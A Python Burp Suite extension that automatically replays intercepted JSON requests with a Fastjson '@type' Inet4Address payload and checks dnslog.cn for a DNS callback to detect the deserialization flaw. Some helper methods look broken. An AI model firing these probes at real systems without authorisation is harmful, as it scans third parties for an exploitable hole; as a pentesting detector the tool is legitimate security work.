# /usr/bin/env python
# _*_ coding:utf-8 _*_
__author__ = 'f0ng'

from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
import sys
import time
import os
import re
import requests
from hashlib import md5
import random



def randmd5():
    new_md5 = md5()
    new_md5.update(str(random.randint(1, 1000)))
    return new_md5.hexdigest()[:6]


class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        print("[+] #####################################")
        print("[+]     FastjsonScandnslog")
        print("[+]     Author:   f0ng")
        print("[+] #####################################\r\n\r\n")
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName('FastjsonScandnslog')
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        response_is_json = False
        # if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER:
        if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER:
            # 监听Response
            if not messageIsRequest:

                '''请求数据'''
                # 获取请求包的数据
                resquest = messageInfo.getRequest()
                analyzedRequest = self._helpers.analyzeRequest(resquest)
                request_header = analyzedRequest.getHeaders()
                request_bodys = resquest[analyzedRequest.getBodyOffset():].tostring()
                request_host, request_Path = self.get_request_host(request_header)
                request_contentType = analyzedRequest.getContentType()
                #print "request_contentType:"+str(request_contentType)

                '''响应数据'''
                # 获取响应包数据
                response = messageInfo.getResponse()
                analyzedResponse = self._helpers.analyzeResponse(response)  # returns IResponseInfo
                response_headers = analyzedResponse.getHeaders()
                response_bodys = response[analyzedResponse.getBodyOffset():].tostring()
                response_statusCode = analyzedResponse.getStatusCode()
                expression = r'.*(application/json).*'
                for rpheader in response_headers:
                    if rpheader.startswith("Content-Type:") and re.match(expression, rpheader):
                        response_is_json = True

                # 获取服务信息
                httpService = messageInfo.getHttpService()
                port = httpService.getPort()
                host = httpService.getHost()

                # 请求类型或响应类型是application/json
                if response_is_json or request_contentType == 4:
                    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',}
                    r_first = requests.get("http://dnslog.cn/getdomain.php",headers=headers)
                    r_h = re.findall( r'PHPSESSID=(.*?);', str(r_first.headers))
                    headers["Cookie"] = "PHPSESSID=" + r_h[0]
                    payload_dnslog = str(r_first.content)
                    randomStr = randmd5() 
                    newBodyPayload = '{"b":{"@type":"java.net.Inet4Address","val":"'+ str(randomStr)  + str(host) + '.' + payload_dnslog + '"}}'

                    # newBodyPayload = payload.format(str(randomStr), str(host), str(port))
                    # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
                    newBody = self._helpers.stringToBytes(newBodyPayload)
                    # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
                    newRequest = self._helpers.buildHttpMessage(request_header, newBody)
                    ishttps = False
                    expression = r'.*(443).*'
                    if re.match(expression, str(port)):
                        ishttps = True
                    rep = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
                    r = requests.get("http://dnslog.cn/getrecords.php",headers=headers)

                    r_hh = re.search( r'(.*?) HTTP/', str(request_header), re.M|re.I)

                    if ((randomStr in r.content) and (host in r.content) and (r.status_code == 200)):                        
                        messageInfo.setHighlight('red')
                        print("\t[+] Target vulnerability")
                        print("\t[-] host:" + str(host))
                        print("\t[-] port:" + str(port))
                        print("\t[-] playload:" + str(newBodyPayload) )
                        print("\t[-] 方法以及路径:" + r_hh.group(1) + "\r\n")

                        

    # 获取请求的url
    def get_request_host(self, reqHeaders):
        uri = reqHeaders[0].split(' ')[1]
        host = reqHeaders[1].split(' ')[1]
        return host, uri

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedIRequestInfo = self._helpers.analyzeRequest(request)
        reqHeaders = analyzedIRequestInfo.getHeaders()
        reqBodys = request[analyzedIRequestInfo.getBodyOffset():].tostring()
        reqMethod = analyzedIRequestInfo.getMethod()
        reqParameters = analyzedIRequestInfo.getParameters()
        reqHost, reqPath = self.get_request_host(reqHeaders)
        reqContentType = analyzedIRequestInfo.getContentType()
        print(reqHost, reqPath)
        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters, reqHost, reqContentType

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedIResponseInfo = self._helpers.analyzeRequest(response)
        resHeaders = analyzedIResponseInfo.getHeaders()
        resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
        # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        # resStatusCode = analyzedIResponseInfo.getStatusCode()
        return resHeaders, resBodys

    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        return host, port, protocol

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        pass

    def doPassiveScan(self, baseRequestResponse):
        self.issues = []
        self.start_run(baseRequestResponse)
        return self.issues

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        '''
        相同的数据包，只报告一份报告
        :param existingIssue:
        :param newIssue:
        :return:
        '''

        if existingIssue.getIssueDetail() == newIssue.getIssueDetail():
            return -1

        return 0
